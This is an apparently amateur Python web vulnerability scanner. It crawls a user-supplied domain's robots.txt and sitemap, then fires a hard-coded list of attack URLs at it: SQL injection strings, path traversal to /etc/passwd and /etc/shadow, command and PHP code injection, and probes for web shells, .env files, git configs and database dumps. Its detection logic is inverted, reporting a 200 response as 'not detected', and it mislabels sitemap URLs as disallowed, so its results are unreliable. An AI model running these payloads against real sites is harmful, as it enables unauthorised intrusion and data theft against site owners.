import requests
from bs4 import BeautifulSoup
from colorama import init, Fore, Style

# Initialize colorama
init()

# Example usage:
url = input("Enter the domain name[e.g www.google.com]: ")

# Define color codes
SUCCESS_COLOR = Fore.GREEN
FAILURE_COLOR = Fore.RED
RESET_COLOR = Style.RESET_ALL


def check_robots(url):
    robots_url = f"http://{url}/robots.txt"
    response = requests.get(robots_url)
    if response.status_code == 200:
        disallowed_urls = []
        for line in response.text.split('\n'):
            if line.startswith('Disallow:'):
                disallowed_url = line.split(': ')[1].strip()
                disallowed_urls.append(disallowed_url)
        return disallowed_urls
    else:
        print(f"{FAILURE_COLOR}Error accessing robots.txt.{RESET_COLOR}")
        return []


def check_sitemap(url):
    sitemap_url = f"http://{url}/sitemap.xml"
    response = requests.get(sitemap_url)
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'lxml')
        urls = [loc.text for loc in soup.find_all('loc')]
        return urls
    else:
        print(f"{FAILURE_COLOR}Error accessing sitemap.xml.{RESET_COLOR}")
        return []


def check_disallowed(disallowed_urls, url):
    for disallowed_url in disallowed_urls:
        full_url = f"http://{url}/{disallowed_url.lstrip('/')}"
        try:
            response = requests.get(full_url)
            if response.status_code == 200:
                print(f"{SUCCESS_COLOR}[+] Access to {full_url} successful (200 OK).{RESET_COLOR}")
            else:
                print(f"{FAILURE_COLOR}[-] Access to {full_url} failed.{RESET_COLOR}")
        except requests.exceptions.RequestException as e:
            print(f"{FAILURE_COLOR}[-] Access to {full_url} failed. Error: {e}{RESET_COLOR}")


def check_vulnerabilities(url):

    vuln_urls = [
        f"http://{url}/?id=' OR 1=1--",
        f"http://{url}/../../../etc/passwd",
        f"http://{url}/cmd.php?cmd=whoami",
        f"http://{url}/login.php?username=admin' OR '1'='1' --&password=",
        f"http://{url}/view.php?page=../../../../etc/passwd",
        f"http://{url}/admin/config.php.bak",
        f"http://{url}/phpinfo.php",
        f"http://{url}/uploads/shell.php",
        f"http://{url}/exec.jsp?cmd=whoami",
        f"http://{url}/../../../../etc/shadow",
        f"http://{url}/vulnerable.php?param=<?php system('id'); ?>",
        f"http://{url}/../../../etc/shadow",
        f"http://{url}/config.php.bak",
        f"http://{url}/phpmyadmin/config.inc.php",
        f"http://{url}/.env",
        f"http://{url}/admin/admin.asp",
        f"http://{url}/etc/passwd",
        f"http://{url}/config.php.swp",
        f"http://{url}/wp-config.php",
        f"http://{url}/login.aspx",
        f"http://{url}/phpinfo.php",
        f"http://{url}/admin.php",
        f"http://{url}/index.php.bak",
        f"http://{url}/shell.php",
        f"http://{url}/phpMyAdmin/config.inc.php",
        f"http://{url}/phpinfo.php5",
        f"http://{url}/wp-admin/admin-ajax.php",
        f"http://{url}/wp-config.php.bak",
        f"http://{url}/index.html.bak",
        f"http://{url}/phpMyAdmin/index.php",
        f"http://{url}/.git/config",
        f"http://{url}/admin/index.php",
        f"http://{url}/wp-login.php",
        f"http://{url}/test.php",
        f"http://{url}/wp-admin/admin.php",
        f"http://{url}/database.sql",
        f"http://{url}/admin.php.bak",
        f"http://{url}/phpinfo.html",
        f"http://{url}/wp-config.php.swp",
        f"http://{url}/index.php~",
        f"http://{url}/cgi-bin/php",
        f"http://{url}/admin/index.php.bak",
        f"http://{url}/www/index.php",
        f"http://{url}/.svn/entries",
        f"http://{url}/db.php",
        f"http://{url}/admin/config.php",
        f"http://{url}/info.php",
        f"http://{url}/mysql.php",
        f"http://{url}/cgi-bin/php5",
        f"http://{url}/config.php.bak",
        f"http://{url}/config.php~",
        f"http://{url}/.gitignore",
        f"http://{url}/cgi-bin/php4",
        f"http://{url}/database.php",
        f"http://{url}/db.php.bak",
        f"http://{url}/.DS_Store",
        f"http://{url}/config.php.save",
        f"http://{url}/mysql.sql",
        f"http://{url}/mysql_config.php",
        f"http://{url}/phpinfo.php.bak",
        f"http://{url}/index.html~",
        f"http://{url}/cgi-bin/php.cgi",
        f"http://{url}/admin.cgi",
        f"http://{url}/mysql_dump.sql",
        f"http://{url}/admin/config.inc.php",
        f"http://{url}/information_schema.sql",
        f"http://{url}/phpinfo.bak",
        f"http://{url}/?id=' OR 1=1--",
        f"http://{url}/../../../etc/passwd",
        f"http://{url}/cmd.php?cmd=whoami",
        # Add more vulnerable URLs here
    ]
    
    print(f"{Style.BRIGHT}Checking vulnerabilities:")
    for vuln_url in vuln_urls:
        try:
            response = requests.get(vuln_url)
            if response.status_code == 200:
                print(f"{FAILURE_COLOR}[-] Vulnerability not detected: {vuln_url}{RESET_COLOR}")
            else:
                print(f"{SUCCESS_COLOR}[+] Vulnerability detected: {vuln_url}{RESET_COLOR}")
        except requests.exceptions.RequestException as e:
            print(f"{FAILURE_COLOR}[-] Error checking vulnerability: {vuln_url}. Error: {e}{RESET_COLOR}")


# Check if robots.txt exists
disallowed_urls = check_robots(url)

# Check if sitemap.xml exists
sitemap_urls = check_sitemap(url)

# # Combine disallowed URLs from robots.txt and sitemap.xml
disallowed_urls += sitemap_urls

# Print disallowed URLs
print(f"{Style.BRIGHT}Disallowed URLs:")
for disallowed_url in disallowed_urls:
    print(disallowed_url)

print("\n")

# # Check disallowed URLs
print(f"{Style.BRIGHT}Checking disallowed URLs:")
check_disallowed(disallowed_urls, url)

print("\n")

# Check vulnerabilities
check_vulnerabilities(url)
